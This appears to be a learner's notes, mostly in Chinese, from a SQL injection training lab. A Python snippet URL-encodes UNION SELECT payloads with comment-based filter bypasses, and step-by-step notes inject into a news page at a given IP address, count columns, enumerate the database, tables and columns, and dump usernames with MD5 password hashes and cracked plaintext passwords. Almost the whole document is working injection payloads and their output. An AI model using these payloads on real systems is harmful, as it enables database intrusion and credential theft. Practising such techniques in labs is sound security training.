```
zm = {
    '/':'%2F',
    "'":'%27',
    '(':'%28',
    ')':'%29',
    '*':'%2A',
    '+':'%2B',
    ',':'%2C',
    '=':'%3D',
    ' ':'%20',
    'a':'%61',
    'b':'%62',
    'c':'%63',
    'd':'%64',
    'e':'%65',
    'f':'%66',
    'g':'%67',
    'h':'%68',
    'i':'%69',
    'j':'%6a',
    'k':'%6b',
    'l':'%6c',
    'm':'%6d',
    'n':'%6e',
    'o':'%6f',
    'p':'%70',
    'q':'%71',
    'r':'%72',
    's':'%73',
    't':'%74',
    'u':'%75',
    'v':'%76',
    'w':'%77',
    'x':'%78',
    'y':'%79',
    'z':'%7a',
    '1':'%31',
    '0':'%30',
    '2':'%32',
    '3':'%33',
    '4':'%34',
    '5':'%35',
    '6':'%36',
    '7':'%37',
    '8':'%38',
    '9':'%39',
    '_':'%5F',
    '.':'%2E',
    '-':'%2D',
    '>':'%3e'
}
#url = '/**/union/**/select/**/1,2,3,4'
#url = '/**/union/**/select/**/1,2,database(),4'
#url = "/**/union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'mozhe_discuz_stormgroup'),4"
#url = "/**/union/**/select/**/1,2,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'stormgroup_member'),4"
#url = "/**/union/**/select/**/1,2,(select/**/group_concat(password)/**/from/**/stormgroup_member),4" 
urlcode = ''
for u in url:
    urlcode += zm[u]
print(urlcode)
```
猜测他的语句应该是


猜测后台sql语句
1' 报错
1' --+ 正常
推测
select x from x id = '${id}'
构造以后
select x from x id = '1' -- '

猜解select 字段个数 7
http://219.153.49.228:46049/new_list.php?id=4' order by 7 --+
构造以后
select x from x id = '4' order by 7  -- '

尝试使用union注入
-4' union select 1,2,3,4,5,6,7 --+
可以看到
2 3 4 5 位置处被展示

尝试获取数据库
-4' union select 1,(select database()),3,4,5,6,7 --+
获取数据库：min_ju4t_mel1i

尝试获取数据库表名
-4' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = database()),3,4,5,6,7 --+
获取表名：(@dmin9_td4b},notice,stormgroup_member,tdb_goods

尝试获取stormgroup_member表字段
-4' union select 1,(select group_concat(column_name) from information_schema.columns where table_name ="stormgroup_member"),3,4,5,6,7 --+
获取字段列表：id,name,password,status

尝试获取stormgroup_member表字段内容
-4' union select 1,(select group_concat(name,":",password,"-",status) from stormgroup_member),3,4,5,6,7 --+

mozhe1:c4ea899a06973f44f891504e2efa3356-0,havefun1
mozhe:7fef6171469e80d32c0559f88b377245-0,admin888
mozhe2:df2e21728002dfde009b3418a31cdb9d-0,goodjob8
mozhe3:92504c9b96eb37bc1ac5dcfe085660ae-1,wow666
mozhe4:22848a9af522d214c0fec25947475c73-0,havefun3

纳尼所有账户密码都不对
先冷静思考一下
换个表试试

尝试获取(@dmin9_td4b}表字段  奇形怪状
-4' union select 1,(select group_concat(column_name) from information_schema.columns where table_name ="(@dmin9_td4b}"),3,4,5,6,7 --+
获取字段列表：id,username,password,status


尝试获取(@dmin9_td4b}表字段内容 表名报错，应该是左右圆括号报错了   转义试试
-4' union select 1,(select group_concat(username,":",password,"-",status) from `(@dmin9_td4b}`),3,4,5,6,7 --+

mozhe1:c4ea899a06973f44f891504e2efa3356-0,
mozhe:7fef6171469e80d32c0559f88b377245-0,
mozhe2:cb16f5d9fecbae34d999a17652305de1-0,
mozhe4:22848a9af522d214c0fec25947475c73-0,
mozhe3:83bba24fbaa06ce06524ba3ba853711f-1
